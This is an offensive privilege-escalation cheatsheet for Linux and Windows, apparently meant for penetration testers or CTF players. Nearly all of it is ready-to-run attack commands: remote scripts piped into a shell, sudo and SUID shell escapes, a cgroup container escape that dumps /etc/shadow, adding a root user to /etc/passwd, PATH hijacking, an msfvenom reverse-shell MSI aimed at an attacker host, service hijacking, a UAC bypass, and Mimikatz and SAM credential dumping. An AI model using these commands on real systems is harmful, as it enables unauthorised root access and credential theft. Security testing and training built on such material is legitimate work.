# Privilege Escalation Cheatsheet (Linux & Windows)

## Linux — Automated Enumeration

```bash
# LinPEAS (recommended — most comprehensive)
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# linux-exploit-suggester (kernel exploits)
curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
```

## Linux — SUID / Capabilities / Sudo

```bash
# SUID binaries → check GTFOBins
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null
# cap_setuid: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_dac_read_search: read any file
# cap_net_raw: packet sniffing

# Sudo
sudo -l
# (ALL) NOPASSWD: /usr/bin/find → find . -exec /bin/sh \;
# (ALL) NOPASSWD: /usr/bin/vim → vim -c ':!/bin/sh'
# (ALL) NOPASSWD: /usr/bin/python3 → python3 -c 'import os; os.system("/bin/bash")'
# (ALL) NOPASSWD: /usr/bin/env → env /bin/sh
# (ALL, !root): CVE-2019-14287 → sudo -u#-1 /bin/bash
# env_keep+=LD_PRELOAD → LD_PRELOAD hijack
```

## Linux — Cron & Timers

```bash
crontab -l 2>/dev/null
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/crontab
systemctl list-timers --all

# Wildcards in cron (tar, rsync)
# tar with --checkpoint: create files named --checkpoint=1 and --checkpoint-action=exec=sh shell.sh
# in a dir that gets tar'd by root cron job

# Writable cron scripts → inject reverse shell
# Writable PATH in crontab → binary hijacking
```

## Linux — Writable Files & PATH Hijacking

```bash
# World-writable dirs/files
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc

# Writable /etc/passwd → add root user
openssl passwd -6 password
echo 'hacker:HASH:0:0::/root:/bin/bash' >> /etc/passwd

# PATH hijacking — if SUID/cron binary calls command without full path
echo '#!/bin/bash' > /tmp/ps
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
```

## Linux — Kernel Exploits

```bash
uname -r
# 2.6.x    → Dirty COW (CVE-2016-5195)
# 5.8+     → Dirty Pipe (CVE-2022-0847)
# 5.x      → PwnKit / pkexec (CVE-2021-4034)
# 6.x      → GameOver(lay) (CVE-2023-2640, CVE-2023-32629)
```

## Linux — Container Escape

```bash
# Docker socket
find / -name docker.sock 2>/dev/null
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container (CapEff = 0000003fffffffff)
mkdir /tmp/host && mount /dev/sda1 /tmp/host

# Cgroup escape (notify_on_release)
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w && echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd && echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd && sh -c "echo \$\$ > $d/w/cgroup.procs"
```

## Linux — NFS / Shared Resources

```bash
showmount -e <target>
# no_root_squash → mount, write SUID binary, execute on target
mount -t nfs <target>:/share /mnt
cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash
```

## Linux — Credentials

```bash
# Password files
cat /etc/shadow  # if readable
grep -rli "password\|passwd\|secret\|key\|token" /etc/ /opt/ /var/ /home/ 2>/dev/null

# SSH keys
find / -name id_rsa -o -name id_ed25519 2>/dev/null

# Database creds
cat /var/www/html/wp-config.php 2>/dev/null
find / -name "*.php" -exec grep -l "mysql_connect\|PDO\|pg_connect" {} \; 2>/dev/null

# Bash history
cat /home/*/.bash_history 2>/dev/null
```

---

## Windows — Automated Enumeration

```powershell
# WinPEAS
.\winPEASx64.exe

# SharpUp (GhostPack)
.\SharpUp.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

## Windows — Service Exploitation

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

# Weak service permissions (modify service binary path)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
sc qc VulnService
sc config VulnService binpath="C:\Users\Public\rev.exe"
sc stop VulnService && sc start VulnService

# DLL hijacking
# Find service that loads DLL from writable directory
# Place malicious DLL with expected name
# Restart service

# Insecure service executable permissions
icacls "C:\Program Files\VulnApp\service.exe"
# If writable → replace with reverse shell
```

## Windows — Registry Escalation

```powershell
# AlwaysInstallElevated (SYSTEM-level MSI install)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1:
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# AutoRun programs in writable paths
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# If path is writable → replace binary

# Saved credentials
cmdkey /list
runas /savecred /user:admin cmd.exe
```

## Windows — Token Manipulation

```powershell
# Check current privileges
whoami /priv

# SeImpersonatePrivilege → Potato attacks
# PrintSpoofer (Windows 10+)
.\PrintSpoofer.exe -c "cmd.exe /c whoami"
# GodPotato (universal)
.\GodPotato.exe -cmd "cmd /c whoami"
# JuicyPotato (older Windows)
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *

# SeBackupPrivilege → read any file
robocopy /b C:\Users\Administrator\Desktop C:\Temp flag.txt

# SeRestorePrivilege → write any file
# SeDebugPrivilege → inject into any process
```

## Windows — Credential Harvesting

```powershell
# SAM/SYSTEM dump (requires admin)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
# Then on attacker: secretsdump.py -sam SAM -system SYSTEM LOCAL

# Mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam
mimikatz# sekurlsa::tickets /export

# LaZagne (multi-app password recovery)
.\lazagne.exe all

# Wi-Fi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# DPAPI
mimikatz# dpapi::cred /in:C:\Users\user\AppData\...\Credentials\GUID
```

## Windows — UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# fodhelper.exe bypass (no prompt)
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# UACME — comprehensive UAC bypass tool
# https://github.com/hfiref0x/UACME
```

## Windows — Common CVEs

```
# PrintNightmare (CVE-2021-34527) — RCE via print spooler
# EternalBlue (MS17-010) — SMB RCE
# ZeroLogon (CVE-2020-1472) — Netlogon crypto bug → domain admin
# HiveNightmare / SeriousSAM (CVE-2021-36934) — read SAM as non-admin
# noPac (CVE-2021-42278/42287) — domain user → domain admin

# Check with nmap
nmap --script smb-vuln-ms17-010 TARGET
```
